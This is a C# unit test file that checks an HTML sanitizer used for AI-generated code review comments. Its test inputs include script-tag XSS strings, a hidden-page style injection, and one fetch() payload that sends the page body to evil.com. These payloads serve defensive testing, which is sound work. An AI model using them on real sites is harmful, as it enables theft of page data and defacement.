// Copyright (c) Andreas Rain.
// Licensed under the Elastic License 2.0. See LICENSE file in the project root for full license terms.

using System.Text;
using MeisterProPR.Application.Features.Reviewing.Execution.Models;
using MeisterProPR.Infrastructure.Utilities;

namespace MeisterProPR.Infrastructure.Tests.Utilities;

/// <summary>
///     Tests for HtmlSanitizer to ensure HTML injection prevention
///     while preserving markdown formatting.
/// </summary>
public class HtmlSanitizerTests
{
    [Fact]
    public void Sanitize_NullInput_ReturnsEmpty()
    {
        var result = HtmlSanitizer.Sanitize(null);
        Assert.Equal(string.Empty, result);
    }

    [Fact]
    public void Sanitize_EmptyInput_ReturnsEmpty()
    {
        var result = HtmlSanitizer.Sanitize(string.Empty);
        Assert.Equal(string.Empty, result);
    }

    [Fact]
    public void Sanitize_PlainText_Unchanged()
    {
        const string input = "This is plain text with no special characters.";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal(input, result);
    }

    [Fact]
    public void Sanitize_StyleTag_Escaped()
    {
        const string input = "<style>body { color: red; }</style>";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("&lt;style&gt;body { color: red; }&lt;/style&gt;", result);
    }

    [Fact]
    public void Sanitize_ScriptTag_Escaped()
    {
        const string input = "<script>alert('xss')</script>";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;", result);
    }

    [Fact]
    public void Sanitize_DivTag_Escaped()
    {
        const string input = "<div class='danger'>Content</div>";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("&lt;div class=&#39;danger&#39;&gt;Content&lt;/div&gt;", result);
    }

    [Fact]
    public void Sanitize_DocTypeDeclaration_Escaped()
    {
        const string input = "<!DOCTYPE html>\n<html>";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("&lt;!DOCTYPE html&gt;\n&lt;html&gt;", result);
    }

    [Fact]
    public void Sanitize_MarkdownBold_Preserved()
    {
        const string input = "This is **bold** text.";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal(input, result);
    }

    [Fact]
    public void Sanitize_MarkdownItalic_Preserved()
    {
        const string input = "This is *italic* or _also italic_ text.";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal(input, result);
    }

    [Fact]
    public void Sanitize_MarkdownCodeFence_Preserved()
    {
        const string input = "```\ncode here\n```";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal(input, result);
    }

    [Fact]
    public void Sanitize_MarkdownLink_Preserved()
    {
        const string input = "Check [this link](https://example.com).";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal(input, result);
    }

    [Fact]
    public void Sanitize_MarkdownList_Preserved()
    {
        const string input = "- Item 1\n- Item 2\n- Item 3";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal(input, result);
    }

    [Fact]
    public void Sanitize_CodeWithAngleBracketsInFence_EscapedCorrectly()
    {
        const string input = "```\npublic class Foo<T> { }\n```";
        var result = HtmlSanitizer.Sanitize(input);
        // Note: Even code inside backticks gets escaped. This is intentional.
        // The advantage: prevents any angle bracket from causing HTML issues.
        // Users can use backticks or code fences as additional protection.
        Assert.Equal("```\npublic class Foo&lt;T&gt; { }\n```", result);
    }

    [Fact]
    public void Sanitize_MultipleHtmlTags_AllEscaped()
    {
        const string input = "Text with <style> and <script> and <div> tags.";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("Text with &lt;style&gt; and &lt;script&gt; and &lt;div&gt; tags.", result);
    }

    [Fact]
    public void Sanitize_GreaterThanLessThan_Escaped()
    {
        const string input = "if (x > 5 && y < 10) { }";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("if (x &gt; 5 &amp;&amp; y &lt; 10) { }", result);
    }

    [Fact]
    public void Sanitize_IFrameTag_Escaped()
    {
        const string input = "<iframe src='malicious.html'></iframe>";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("&lt;iframe src=&#39;malicious.html&#39;&gt;&lt;/iframe&gt;", result);
    }

    [Fact]
    public void SanitizeInPlace_AppliesChanges()
    {
        var builder = new StringBuilder("<style>test</style>");
        HtmlSanitizer.SanitizeInPlace(builder);
        Assert.Equal("&lt;style&gt;test&lt;/style&gt;", builder.ToString());
    }

    [Fact]
    public void SanitizeInPlace_WithNull_ThrowsArgumentNull()
    {
        Assert.Throws<ArgumentNullException>(() => HtmlSanitizer.SanitizeInPlace(null!));
    }

    [Fact]
    public void Sanitize_ComplexMaliciousPayload_SafelyEscaped()
    {
        const string input =
            "Check this review: <script>fetch('http://evil.com?data=' + document.body.innerHTML)</script>";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal(
            "Check this review: &lt;script&gt;fetch(&#39;http://evil.com?data=&#39; + document.body.innerHTML)&lt;/script&gt;",
            result);
    }

    [Fact]
    public void Sanitize_AdoCommentWithStyleTagInjection_Prevented()
    {
        // This represents what an AI might accidentally generate
        const string input =
            """
            ERROR: Missing null check here.
            <style>
            body {
                display: none;
            }
            </style>
            """;
        var result = HtmlSanitizer.Sanitize(input);
        Assert.DoesNotContain("<style>", result);
        Assert.DoesNotContain("</style>", result);
        Assert.Contains("&lt;style&gt;", result);
        Assert.Contains("&lt;/style&gt;", result);
    }

    [Fact]
    public void Sanitize_ReviewSummaryWithCodeExample_Preserved()
    {
        const string input =
            """
            **Summary**

            Found 2 issues:

            1. Missing index on `users` table
            2. Generic constraint issue with `Foo<T>`
            """;
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Contains("&lt;T&gt;", result);
        Assert.DoesNotContain("<T>", result);
    }

    [Fact]
    public void Sanitize_ConsecutiveAngleBrackets_AllEscaped()
    {
        const string input = "<<< malicious >>>";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("&lt;&lt;&lt; malicious &gt;&gt;&gt;", result);
    }

    [Fact]
    public void Sanitize_AttributeWithQuotesEscaped()
    {
        const string input = """<img src="test.jpg" alt="bad<>quotes">""";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("&lt;img src=&quot;test.jpg&quot; alt=&quot;bad&lt;&gt;quotes&quot;&gt;", result);
    }

    [Fact]
    public void RenderForDisplay_QuotedShellCommand_PreservesReadableQuotes()
    {
        const string input = "dotnet \"$ProCursorDll\" --output \"$ApiDll\" && echo \"done\"";

        var result = HtmlSanitizer.RenderForDisplay(input, ReviewBodyRenderingMode.ThreadReply);

        Assert.Equal(input, result.RenderedText);
        Assert.DoesNotContain("&quot;", result.RenderedText);
        Assert.False(result.ContainsUnsafeMarkup);
        Assert.Empty(result.SafetyTransformations);
    }

    [Fact]
    public void RenderForDisplay_HtmlLikeMarkup_IsNeutralizedWithoutEntityNoise()
    {
        const string input = "Use \"$ApiDll\" after <script>alert('xss')</script> is removed.";

        var result = HtmlSanitizer.RenderForDisplay(input, ReviewBodyRenderingMode.InlineComment);

        Assert.DoesNotContain("&quot;", result.RenderedText);
        Assert.Equal(-1, result.RenderedText.IndexOf("<script>", StringComparison.Ordinal));
        Assert.Equal(-1, result.RenderedText.IndexOf("</script>", StringComparison.Ordinal));
        Assert.Contains("<\u200Bscript>", result.RenderedText);
        Assert.Contains("<\u200B/script>", result.RenderedText);
        Assert.True(result.ContainsUnsafeMarkup);
        Assert.NotEmpty(result.SafetyTransformations);
    }

    [Fact]
    public void RenderForDisplay_TagEmbeddedInWord_IsStillNeutralized()
    {
        const string input = "prefix<script>alert(1)</script> suffix";

        var result = HtmlSanitizer.RenderForDisplay(input, ReviewBodyRenderingMode.InlineComment);

        Assert.Equal(-1, result.RenderedText.IndexOf("<script>", StringComparison.Ordinal));
        Assert.Equal(-1, result.RenderedText.IndexOf("</script>", StringComparison.Ordinal));
        Assert.Contains("prefix<\u200Bscript>", result.RenderedText);
        Assert.Contains("<\u200B/script>", result.RenderedText);
        Assert.True(result.ContainsUnsafeMarkup);
    }
}
